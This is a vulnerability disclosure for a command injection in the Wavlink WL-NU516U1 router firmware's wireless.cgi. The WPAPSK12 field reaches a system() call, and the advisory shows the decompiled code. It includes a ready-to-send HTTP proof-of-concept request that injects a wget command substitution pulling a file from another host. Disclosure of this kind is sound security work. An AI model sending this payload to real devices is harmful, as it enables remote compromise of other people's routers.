# WL-NU516U1 wireless.cgi multi_ssid WPAPSK12 Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `multi_ssid`, the function `sub_401D68` is invoked.

The `WPAPSK12` parameter flows into `set_bss.sh` commands via sprintf:

```c
sprintf(v29, "set_bss.sh set 2 \"%s\" \"%s\" \"%s\" \"%s\" \"%s\"", v8, v14, v18, v22, v34);
system(v29);
```

Where `v22` = WPAPSK12 (user-controlled). The value is placed inside double quotes in the shell command.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 126

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=WPA2PSK&EncrypType2=AES&WPAPSK12=$(wget http://192.168.6.1:6666/wpa12)
```
